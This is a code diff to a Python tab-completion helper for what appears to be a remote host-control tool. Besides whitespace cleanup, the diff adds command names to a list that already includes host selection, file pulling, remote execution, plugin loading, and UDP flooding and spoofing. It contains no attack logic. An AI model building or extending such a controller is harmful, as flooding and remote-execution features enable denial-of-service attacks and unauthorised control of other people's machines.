@@ -9,7 +9,7 @@ class autocomplete(object):
         response = None
         if state == 0:
             if text:
-                self.matches = [s 
+                self.matches = [s
                     for s in self.options
                     if s and s.startswith(text)
                 ]
@@ -27,22 +27,29 @@ class autocomplete(object):
 #You can add more commands here, i just get them 'RPET_server.py'
 def commands():
     return [
-        "List_Hosts",   
+        "List_Hosts",
         "Choose_Host",
-        "Select",      
-        "ALL", 
-        "Pull_File",      
-        "Pull_Binary",  
-        "Make_File",     
-        "Make_Binary",   
-        "UDP_Flood",     
-        "UDP_Spoof",       
-        "KILL",           
-        "List_Commands",
-        "List_Sel_Hosts",           
+        "Select",
+        "ALL",
+        "Pull_File",
+        "Pull_Binary",
+        "Make_File",
+        "Make_Binary",
+        "UDP_Flood",
+        "UDP_Spoof",
+        "KILL",
+        "help",
+        "List_Sel_Hosts",
         "Close_Connection",
-        "Exit",   
-        ]    
+        "Exit",
+        "Quit",
+        "Execute",
+        "Install_Plugin",
+        "Load_Plugin",
+        "Available_Plugins",
+        "Installed_Plugins",
+        "Loaded_Plugins",
+        ]
 
 
 readline.set_completer(autocomplete(commands()).complete)
